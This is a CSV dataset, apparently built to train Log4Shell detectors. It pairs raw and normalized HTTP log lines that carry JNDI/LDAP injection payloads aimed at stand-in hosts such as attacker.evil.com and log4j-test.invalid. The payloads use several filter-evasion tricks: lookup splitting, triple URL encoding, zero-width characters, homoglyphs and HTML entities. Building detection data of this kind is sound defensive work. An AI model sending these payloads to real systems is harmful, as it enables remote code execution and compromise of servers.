id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-001530,2026-05-17,adversarial_evasion,GET /search?q=${${date:'j'}ndi:ldap://attacker.evil.com/date-j} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${${date:'j'}ndi:ldap://attacker.evil.com/date-j} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,semantic_lookup_jndi,path,train,critical
LS-001531,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${${date:'j'}ndi:ldap://attacker.evil.com/date-j},post /search http/1.1 host: app.local body: query=${${date:'j'}ndi:ldap://attacker.evil.com/date-j},1,log4shell,semantic_lookup_jndi,body,train,critical
LS-001532,2026-05-17,adversarial_evasion,GET /?q=${${date:'j'}ndi:ldap://attacker.evil.com/date-j} HTTP/1.1,get /?q=${${date:'j'}ndi:ldap://attacker.evil.com/date-j} http/1.1,1,log4shell,semantic_lookup_jndi,minimal_query,train,critical
LS-001533,2026-05-17,adversarial_evasion,GET /api/check?debug=${${date:'j'}ndi:ldap://attacker.evil.com/date-j} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'j'}ndi:ldap://attacker.evil.com/date-j} http/1.1 host: app.local,1,log4shell,semantic_lookup_jndi,uri_param,train,critical
LS-001534,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'j'}ndi:ldap://attacker.evil.com/date-j} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${${date:'j'}ndi:ldap://attacker.evil.com/date-j} | method: get | host: app.local | path: /metrics,1,log4shell,semantic_lookup_jndi,user_agent,train,critical
LS-001535,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'j'}ndi:ldap://attacker.evil.com/date-j},request from user-agent: ${${date:'j'}ndi:ldap://attacker.evil.com/date-j},1,log4shell,semantic_lookup_jndi,user_agent_minimal,train,critical
LS-001536,2026-05-17,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${${date:'j'}ndi:ldap://attacker.evil.com/date-j},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /static/app.js | x-api-version: ${${date:'j'}ndi:ldap://attacker.evil.com/date-j},1,log4shell,semantic_lookup_jndi,x_api_version,train,critical
LS-001537,2026-05-17,adversarial_evasion,GET /?q=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-train%25257D HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/triple-train} http/1.1,1,log4shell,triple_url_encoded,minimal_query,train,critical
LS-001538,2026-05-17,adversarial_evasion,GET /api/check?debug=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-train%25257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/triple-train} http/1.1 host: app.local,1,log4shell,triple_url_encoded,uri_param,train,critical
LS-001539,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-train%25257D | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://attacker.evil.com/triple-train} | method: get | host: app.local | path: /static/app.js,1,log4shell,triple_url_encoded,user_agent,train,critical
LS-001540,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-train%25257D,request from user-agent: ${jndi:ldap://attacker.evil.com/triple-train},1,log4shell,triple_url_encoded,user_agent_minimal,train,critical
LS-001541,2026-05-17,adversarial_evasion,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: / | X-Api-Version: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-train%25257D,request from user-agent: java/11.0.13 | method: get | host: app.local | path: / | x-api-version: ${jndi:ldap://attacker.evil.com/triple-train},1,log4shell,triple_url_encoded,x_api_version,train,critical
LS-001542,2026-05-17,adversarial_evasion,GET /search?q=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-train%25257D HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${jndi:ldap://attacker.evil.com/triple-train} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,triple_url_encoded,path,train,critical
LS-001543,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-train%25257D,post /search http/1.1 host: app.local body: query=${jndi:ldap://attacker.evil.com/triple-train},1,log4shell,triple_url_encoded,body,train,critical
LS-001544,2026-05-17,adversarial_evasion,GET /?q=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-train%25257D HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/triple-train} http/1.1,1,log4shell,triple_url_encoded,minimal_query,train,critical
LS-001545,2026-05-17,adversarial_evasion,GET /api/check?debug=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-train%25257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/triple-train} http/1.1 host: app.local,1,log4shell,triple_url_encoded,uri_param,train,critical
LS-001546,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-train%25257D | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://attacker.evil.com/triple-train} | method: get | host: app.local | path: /static/app.js,1,log4shell,triple_url_encoded,user_agent,train,critical
LS-001547,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-train%25257D,request from user-agent: ${jndi:ldap://attacker.evil.com/triple-train},1,log4shell,triple_url_encoded,user_agent_minimal,train,critical
LS-001548,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /home | X-Api-Version: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fattacker.evil.com%25252Ftriple-train%25257D,request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldap://attacker.evil.com/triple-train},1,log4shell,triple_url_encoded,x_api_version,train,critical
LS-001681,2026-05-17,adversarial_evasion,GET /?q=${j​ndi:ldap://log4j-test.invalid/zw-j} HTTP/1.1,get /?q=${j​ndi:ldap://log4j-test.invalid/zw-j} http/1.1,1,log4shell,zero_width_jndi,minimal_query,train,critical
LS-001682,2026-05-17,adversarial_evasion,GET /api/check?debug=${j​ndi:ldap://log4j-test.invalid/zw-j} HTTP/1.1 Host: app.local,get /api/check?debug=${j​ndi:ldap://log4j-test.invalid/zw-j} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,train,critical
LS-001683,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​ndi:ldap://log4j-test.invalid/zw-j} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${j​ndi:ldap://log4j-test.invalid/zw-j} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,zero_width_jndi,user_agent,train,critical
LS-001684,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​ndi:ldap://log4j-test.invalid/zw-j},request from user-agent: ${j​ndi:ldap://log4j-test.invalid/zw-j},1,log4shell,zero_width_jndi,user_agent_minimal,train,critical
LS-001685,2026-05-17,adversarial_evasion,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${j​ndi:ldap://log4j-test.invalid/zw-j},request from user-agent: java/11.0.13 | method: get | host: app.local | path: / | x-api-version: ${j​ndi:ldap://log4j-test.invalid/zw-j},1,log4shell,zero_width_jndi,x_api_version,train,critical
LS-001686,2026-05-17,adversarial_evasion,GET /search?q=${j​ndi:ldap://log4j-test.invalid/zw-j} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${j​ndi:ldap://log4j-test.invalid/zw-j} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,zero_width_jndi,path,train,critical
LS-001687,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${j​ndi:ldap://log4j-test.invalid/zw-j},post /search http/1.1 host: app.local body: query=${j​ndi:ldap://log4j-test.invalid/zw-j},1,log4shell,zero_width_jndi,body,train,critical
LS-001688,2026-05-17,adversarial_evasion,GET /?q=${j​ndi:ldap://log4j-test.invalid/zw-j} HTTP/1.1,get /?q=${j​ndi:ldap://log4j-test.invalid/zw-j} http/1.1,1,log4shell,zero_width_jndi,minimal_query,train,critical
LS-001689,2026-05-17,adversarial_evasion,GET /api/check?debug=${j​ndi:ldap://log4j-test.invalid/zw-j} HTTP/1.1 Host: app.local,get /api/check?debug=${j​ndi:ldap://log4j-test.invalid/zw-j} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,train,critical
LS-001690,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​ndi:ldap://log4j-test.invalid/zw-j} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${j​ndi:ldap://log4j-test.invalid/zw-j} | method: get | host: app.local | path: /login,1,log4shell,zero_width_jndi,user_agent,train,critical
LS-001691,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​ndi:ldap://log4j-test.invalid/zw-j},request from user-agent: ${j​ndi:ldap://log4j-test.invalid/zw-j},1,log4shell,zero_width_jndi,user_agent_minimal,train,critical
LS-001692,2026-05-17,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${j​ndi:ldap://log4j-test.invalid/zw-j},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${j​ndi:ldap://log4j-test.invalid/zw-j},1,log4shell,zero_width_jndi,x_api_version,train,critical
LS-001693,2026-05-17,adversarial_evasion,GET /?q=${jn‌di:ldap://log4j-test.invalid/zw-n} HTTP/1.1,get /?q=${jn‌di:ldap://log4j-test.invalid/zw-n} http/1.1,1,log4shell,zero_width_jndi,minimal_query,train,critical
LS-001694,2026-05-17,adversarial_evasion,GET /api/check?debug=${jn‌di:ldap://log4j-test.invalid/zw-n} HTTP/1.1 Host: app.local,get /api/check?debug=${jn‌di:ldap://log4j-test.invalid/zw-n} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,train,critical
LS-001695,2026-05-17,adversarial_evasion,Request from User-Agent: ${jn‌di:ldap://log4j-test.invalid/zw-n} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jn‌di:ldap://log4j-test.invalid/zw-n} | method: get | host: app.local | path: /static/app.js,1,log4shell,zero_width_jndi,user_agent,train,critical
LS-001696,2026-05-17,adversarial_evasion,Request from User-Agent: ${jn‌di:ldap://log4j-test.invalid/zw-n},request from user-agent: ${jn‌di:ldap://log4j-test.invalid/zw-n},1,log4shell,zero_width_jndi,user_agent_minimal,train,critical
LS-001697,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${jn‌di:ldap://log4j-test.invalid/zw-n},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: / | x-api-version: ${jn‌di:ldap://log4j-test.invalid/zw-n},1,log4shell,zero_width_jndi,x_api_version,train,critical
LS-001698,2026-05-17,adversarial_evasion,GET /search?q=${jn‌di:ldap://log4j-test.invalid/zw-n} HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${jn‌di:ldap://log4j-test.invalid/zw-n} http/1.1 host: app.local user-agent: java/11.0.13,1,log4shell,zero_width_jndi,path,train,critical
LS-001699,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${jn‌di:ldap://log4j-test.invalid/zw-n},post /search http/1.1 host: app.local body: query=${jn‌di:ldap://log4j-test.invalid/zw-n},1,log4shell,zero_width_jndi,body,train,critical
LS-001700,2026-05-17,adversarial_evasion,GET /?q=${jn‌di:ldap://log4j-test.invalid/zw-n} HTTP/1.1,get /?q=${jn‌di:ldap://log4j-test.invalid/zw-n} http/1.1,1,log4shell,zero_width_jndi,minimal_query,train,critical
LS-001701,2026-05-17,adversarial_evasion,GET /api/check?debug=${jn‌di:ldap://log4j-test.invalid/zw-n} HTTP/1.1 Host: app.local,get /api/check?debug=${jn‌di:ldap://log4j-test.invalid/zw-n} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,train,critical
LS-001702,2026-05-17,adversarial_evasion,Request from User-Agent: ${jn‌di:ldap://log4j-test.invalid/zw-n} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jn‌di:ldap://log4j-test.invalid/zw-n} | method: get | host: app.local | path: /metrics,1,log4shell,zero_width_jndi,user_agent,train,critical
LS-001703,2026-05-17,adversarial_evasion,Request from User-Agent: ${jn‌di:ldap://log4j-test.invalid/zw-n},request from user-agent: ${jn‌di:ldap://log4j-test.invalid/zw-n},1,log4shell,zero_width_jndi,user_agent_minimal,train,critical
LS-001704,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${jn‌di:ldap://log4j-test.invalid/zw-n},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jn‌di:ldap://log4j-test.invalid/zw-n},1,log4shell,zero_width_jndi,x_api_version,train,critical
LS-001705,2026-05-17,adversarial_evasion,GET /?q=${ȷndi:ldap://log4j-test.invalid/latin-dotless-j} HTTP/1.1,get /?q=${ȷndi:ldap://log4j-test.invalid/latin-dotless-j} http/1.1,1,log4shell,homoglyph_jndi,minimal_query,train,critical
LS-001706,2026-05-17,adversarial_evasion,GET /api/check?debug=${ȷndi:ldap://log4j-test.invalid/latin-dotless-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ȷndi:ldap://log4j-test.invalid/latin-dotless-j} http/1.1 host: app.local,1,log4shell,homoglyph_jndi,uri_param,train,critical
LS-001707,2026-05-17,adversarial_evasion,Request from User-Agent: ${ȷndi:ldap://log4j-test.invalid/latin-dotless-j} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${ȷndi:ldap://log4j-test.invalid/latin-dotless-j} | method: get | host: app.local | path: /home,1,log4shell,homoglyph_jndi,user_agent,train,critical
LS-001708,2026-05-17,adversarial_evasion,Request from User-Agent: ${ȷndi:ldap://log4j-test.invalid/latin-dotless-j},request from user-agent: ${ȷndi:ldap://log4j-test.invalid/latin-dotless-j},1,log4shell,homoglyph_jndi,user_agent_minimal,train,critical
LS-001709,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${ȷndi:ldap://log4j-test.invalid/latin-dotless-j},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /static/app.js | x-api-version: ${ȷndi:ldap://log4j-test.invalid/latin-dotless-j},1,log4shell,homoglyph_jndi,x_api_version,train,critical
LS-001710,2026-05-17,adversarial_evasion,GET /search?q=${ȷndi:ldap://log4j-test.invalid/latin-dotless-j} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${ȷndi:ldap://log4j-test.invalid/latin-dotless-j} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,homoglyph_jndi,path,train,critical
LS-001711,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${ȷndi:ldap://log4j-test.invalid/latin-dotless-j},post /search http/1.1 host: app.local body: query=${ȷndi:ldap://log4j-test.invalid/latin-dotless-j},1,log4shell,homoglyph_jndi,body,train,critical
LS-001712,2026-05-17,adversarial_evasion,GET /?q=${ȷndi:ldap://log4j-test.invalid/latin-dotless-j} HTTP/1.1,get /?q=${ȷndi:ldap://log4j-test.invalid/latin-dotless-j} http/1.1,1,log4shell,homoglyph_jndi,minimal_query,train,critical
LS-001713,2026-05-17,adversarial_evasion,GET /api/check?debug=${ȷndi:ldap://log4j-test.invalid/latin-dotless-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ȷndi:ldap://log4j-test.invalid/latin-dotless-j} http/1.1 host: app.local,1,log4shell,homoglyph_jndi,uri_param,train,critical
LS-001714,2026-05-17,adversarial_evasion,Request from User-Agent: ${ȷndi:ldap://log4j-test.invalid/latin-dotless-j} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${ȷndi:ldap://log4j-test.invalid/latin-dotless-j} | method: get | host: app.local | path: /static/app.js,1,log4shell,homoglyph_jndi,user_agent,train,critical
LS-001715,2026-05-17,adversarial_evasion,Request from User-Agent: ${ȷndi:ldap://log4j-test.invalid/latin-dotless-j},request from user-agent: ${ȷndi:ldap://log4j-test.invalid/latin-dotless-j},1,log4shell,homoglyph_jndi,user_agent_minimal,train,critical
LS-001716,2026-05-17,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${ȷndi:ldap://log4j-test.invalid/latin-dotless-j},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /home | x-api-version: ${ȷndi:ldap://log4j-test.invalid/latin-dotless-j},1,log4shell,homoglyph_jndi,x_api_version,train,critical
LS-001717,2026-05-17,adversarial_evasion,GET /?q=${jndі:ldap://log4j-test.invalid/cyrillic-i} HTTP/1.1,get /?q=${jndі:ldap://log4j-test.invalid/cyrillic-i} http/1.1,1,log4shell,homoglyph_jndi,minimal_query,train,critical
LS-001718,2026-05-17,adversarial_evasion,GET /api/check?debug=${jndі:ldap://log4j-test.invalid/cyrillic-i} HTTP/1.1 Host: app.local,get /api/check?debug=${jndі:ldap://log4j-test.invalid/cyrillic-i} http/1.1 host: app.local,1,log4shell,homoglyph_jndi,uri_param,train,critical
LS-001719,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndі:ldap://log4j-test.invalid/cyrillic-i} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndі:ldap://log4j-test.invalid/cyrillic-i} | method: get | host: app.local | path: /,1,log4shell,homoglyph_jndi,user_agent,train,critical
LS-001720,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndі:ldap://log4j-test.invalid/cyrillic-i},request from user-agent: ${jndі:ldap://log4j-test.invalid/cyrillic-i},1,log4shell,homoglyph_jndi,user_agent_minimal,train,critical
LS-001721,2026-05-17,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${jndі:ldap://log4j-test.invalid/cyrillic-i},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndі:ldap://log4j-test.invalid/cyrillic-i},1,log4shell,homoglyph_jndi,x_api_version,train,critical
LS-001722,2026-05-17,adversarial_evasion,GET /search?q=${jndі:ldap://log4j-test.invalid/cyrillic-i} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndі:ldap://log4j-test.invalid/cyrillic-i} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,homoglyph_jndi,path,train,critical
LS-001723,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${jndі:ldap://log4j-test.invalid/cyrillic-i},post /search http/1.1 host: app.local body: query=${jndі:ldap://log4j-test.invalid/cyrillic-i},1,log4shell,homoglyph_jndi,body,train,critical
LS-001724,2026-05-17,adversarial_evasion,GET /?q=${jndі:ldap://log4j-test.invalid/cyrillic-i} HTTP/1.1,get /?q=${jndі:ldap://log4j-test.invalid/cyrillic-i} http/1.1,1,log4shell,homoglyph_jndi,minimal_query,train,critical
LS-001725,2026-05-17,adversarial_evasion,GET /api/check?debug=${jndі:ldap://log4j-test.invalid/cyrillic-i} HTTP/1.1 Host: app.local,get /api/check?debug=${jndі:ldap://log4j-test.invalid/cyrillic-i} http/1.1 host: app.local,1,log4shell,homoglyph_jndi,uri_param,train,critical
LS-001726,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndі:ldap://log4j-test.invalid/cyrillic-i} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndі:ldap://log4j-test.invalid/cyrillic-i} | method: get | host: app.local | path: /search?q=boots,1,log4shell,homoglyph_jndi,user_agent,train,critical
LS-001727,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndі:ldap://log4j-test.invalid/cyrillic-i},request from user-agent: ${jndі:ldap://log4j-test.invalid/cyrillic-i},1,log4shell,homoglyph_jndi,user_agent_minimal,train,critical
LS-001728,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${jndі:ldap://log4j-test.invalid/cyrillic-i},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndі:ldap://log4j-test.invalid/cyrillic-i},1,log4shell,homoglyph_jndi,x_api_version,train,critical
LS-001729,2026-05-17,adversarial_evasion,GET /?q=${&#106;ndi:ldap://log4j-test.invalid/html-decimal} HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/html-decimal} http/1.1,1,log4shell,html_entity_jndi,minimal_query,train,critical
LS-001730,2026-05-17,adversarial_evasion,GET /api/check?debug=${&#106;ndi:ldap://log4j-test.invalid/html-decimal} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/html-decimal} http/1.1 host: app.local,1,log4shell,html_entity_jndi,uri_param,train,critical
LS-001731,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#106;ndi:ldap://log4j-test.invalid/html-decimal} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://log4j-test.invalid/html-decimal} | method: get | host: app.local | path: /home,1,log4shell,html_entity_jndi,user_agent,train,critical
LS-001732,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#106;ndi:ldap://log4j-test.invalid/html-decimal},request from user-agent: ${jndi:ldap://log4j-test.invalid/html-decimal},1,log4shell,html_entity_jndi,user_agent_minimal,train,critical
LS-001733,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${&#106;ndi:ldap://log4j-test.invalid/html-decimal},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: / | x-api-version: ${jndi:ldap://log4j-test.invalid/html-decimal},1,log4shell,html_entity_jndi,x_api_version,train,critical
LS-001734,2026-05-17,adversarial_evasion,GET /search?q=${&#106;ndi:ldap://log4j-test.invalid/html-decimal} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${jndi:ldap://log4j-test.invalid/html-decimal} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,html_entity_jndi,path,train,critical
LS-001735,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${&#106;ndi:ldap://log4j-test.invalid/html-decimal},post /search http/1.1 host: app.local body: query=${jndi:ldap://log4j-test.invalid/html-decimal},1,log4shell,html_entity_jndi,body,train,critical
LS-001736,2026-05-17,adversarial_evasion,GET /?q=${&#106;ndi:ldap://log4j-test.invalid/html-decimal} HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/html-decimal} http/1.1,1,log4shell,html_entity_jndi,minimal_query,train,critical
LS-001737,2026-05-17,adversarial_evasion,GET /api/check?debug=${&#106;ndi:ldap://log4j-test.invalid/html-decimal} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/html-decimal} http/1.1 host: app.local,1,log4shell,html_entity_jndi,uri_param,train,critical
LS-001738,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#106;ndi:ldap://log4j-test.invalid/html-decimal} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi:ldap://log4j-test.invalid/html-decimal} | method: get | host: app.local | path: /search?q=boots,1,log4shell,html_entity_jndi,user_agent,train,critical
LS-001739,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#106;ndi:ldap://log4j-test.invalid/html-decimal},request from user-agent: ${jndi:ldap://log4j-test.invalid/html-decimal},1,log4shell,html_entity_jndi,user_agent_minimal,train,critical
LS-001740,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${&#106;ndi:ldap://log4j-test.invalid/html-decimal},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://log4j-test.invalid/html-decimal},1,log4shell,html_entity_jndi,x_api_version,train,critical
LS-001741,2026-05-17,adversarial_evasion,GET /?q=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://log4j-test.invalid/full-split} HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/full-split} http/1.1,1,log4shell,lookup_character_concat,minimal_query,train,critical
LS-001742,2026-05-17,adversarial_evasion,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://log4j-test.invalid/full-split} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/full-split} http/1.1 host: app.local,1,log4shell,lookup_character_concat,uri_param,train,critical
LS-001743,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://log4j-test.invalid/full-split} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:ldap://log4j-test.invalid/full-split} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,lookup_character_concat,user_agent,train,critical
LS-001744,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://log4j-test.invalid/full-split},request from user-agent: ${jndi:ldap://log4j-test.invalid/full-split},1,log4shell,lookup_character_concat,user_agent_minimal,train,critical
LS-001745,2026-05-17,adversarial_evasion,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://log4j-test.invalid/full-split},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldap://log4j-test.invalid/full-split},1,log4shell,lookup_character_concat,x_api_version,train,critical
LS-001746,2026-05-17,adversarial_evasion,GET /search?q=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://log4j-test.invalid/full-split} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${jndi:ldap://log4j-test.invalid/full-split} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,lookup_character_concat,path,train,critical
LS-001747,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://log4j-test.invalid/full-split},post /search http/1.1 host: app.local body: query=${jndi:ldap://log4j-test.invalid/full-split},1,log4shell,lookup_character_concat,body,train,critical
LS-001748,2026-05-17,adversarial_evasion,GET /?q=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://log4j-test.invalid/full-split} HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/full-split} http/1.1,1,log4shell,lookup_character_concat,minimal_query,train,critical
